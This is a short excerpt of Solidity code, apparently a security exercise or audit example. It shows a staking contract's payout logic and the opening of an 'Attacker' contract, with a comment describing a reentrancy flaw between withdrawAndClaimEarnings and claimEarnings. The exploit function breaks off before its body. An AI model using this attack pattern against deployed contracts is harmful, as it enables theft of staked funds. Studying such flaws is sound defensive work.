...
contract Depositoor is IERC721Receiver {
    ...
    function payout(address _a) private {
        ...
        if (amountToSend > 50e18) {
            amountToSend = 50e18;
        } else if (amountToSend > rewardToken.balanceOf(address(this))) {
...
contract Attacker is IERC721Receiver {
    ...
    /**
     * delete staked[msg.sender] is executed after NFT transfer => re-entrancy attack between
     * `withdrawAndClaimEarnings` and `claimEarnings`
     */
    function stake(NftToStake nft_, Depositoor depositor_, uint tokenId) public {
        depositor = depositor_;
        nft_.safeTransferFrom(address(this),address(depositor), tokenId);
    }

    function exploit(uint tokenId) public {
